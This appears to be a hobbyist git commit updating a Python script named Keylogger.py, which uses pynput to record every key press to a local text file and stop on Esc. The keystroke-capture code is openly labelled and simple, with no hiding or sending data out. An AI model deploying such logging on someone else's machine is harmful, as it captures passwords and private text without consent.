4b63e3cdd56ea7fc725959cfe067df8bfa405a13
ehlacy01 <70302106+ehlacy01@users.noreply.github.com>
2020-10-17 14:55:29 -0400

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -5,34 +5,31 @@ def on_press(key):
     try:
         print('alphanumeric key {0} pressed'.format(
             key.char))
-        file1.write('{0}\n'.format(key.char))
+        file1.write(key.char + '\n')
     except AttributeError:
         print('special key {0} pressed'.format(
             key))
-        file1.write('{0}\n'.format(
-            key))
+        file1.write('{0}\n'.format(key))
     finally:
         file1.close()
 
-#def on_release(key):
-#    file1 = open("Output.txt","a")
-#    print('{0} released'.format(
-#        key))
-#    file1.write('{0} released\n'.format(
-#        key))
-#    file1.close()
-#    if key == keyboard.Key.esc:
+def on_release(key):
+    print('{0} released'.format(
+        key))
+    if key == keyboard.Key.esc:
         # Stop listener
-#        return False
+        return False
 
 def clearFile():
     file1 = open("Output.txt","w")
-    file1.write()
+    file1.write('')
     file1.close()
     
 # Collect events until released
+clearFile()
 with keyboard.Listener(
-        on_press=on_press) as listener:
+        on_press=on_press,
+        on_release=on_release) as listener:
     listener.join()
 
 # ...or, in a non-blocking fashion:
